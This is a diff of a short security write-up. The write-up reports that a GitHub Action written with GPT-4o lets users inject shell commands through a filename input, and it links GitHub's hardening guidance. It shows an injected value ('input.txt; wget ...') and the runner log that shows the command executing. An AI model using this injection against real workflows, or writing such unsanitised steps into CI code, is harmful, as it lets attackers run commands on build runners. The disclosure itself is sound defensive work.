@@ -22,7 +22,7 @@ Using the latest model GPT 4o, I tried to create a GitHub action to run a comman
 Users who can run the action (e.g in an org) can execute any command by add `; command` to the filename input. For example here run with filename
 
 ```
-input.txt; wget -O- https://httpbin.org/get 
+input.txt; wget -O- https://httpbin.org/get
 ```
 
 and result is
@@ -30,8 +30,8 @@ and result is
 
 ```
 
-Run python main.py input.txt; wget -O- https://httpbin.org/get 
-  python main.py input.txt; wget -O- https://httpbin.org/get 
+Run python main.py input.txt; wget -O- https://httpbin.org/get
+  python main.py input.txt; wget -O- https://httpbin.org/get
   shell: /usr/bin/bash -e {0}
   env:
     pythonLocation: /opt/hostedtoolcache/Python/3.12.8/x64
@@ -58,9 +58,9 @@ v3 was released `Feb 28, 2022`, there were 366 commits between them https://gith
 
 ### Mitigation
 
-While this is buried under "Security" section of GitHub Action docs, user who use GitHub copilot likely won't every open it. 
+While this is buried under "Security" section of GitHub Action docs, user who use GitHub copilot likely won't ever open it.
 
 https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#example-of-a-script-injection-attack
 
-### Should not trust Copilot than anyone on internet :joy:
-### Work with GitHub action is painful :cry:
+## Should not trust Copilot than anyone on internet :joy:
+## Work with GitHub action is painful :cry:
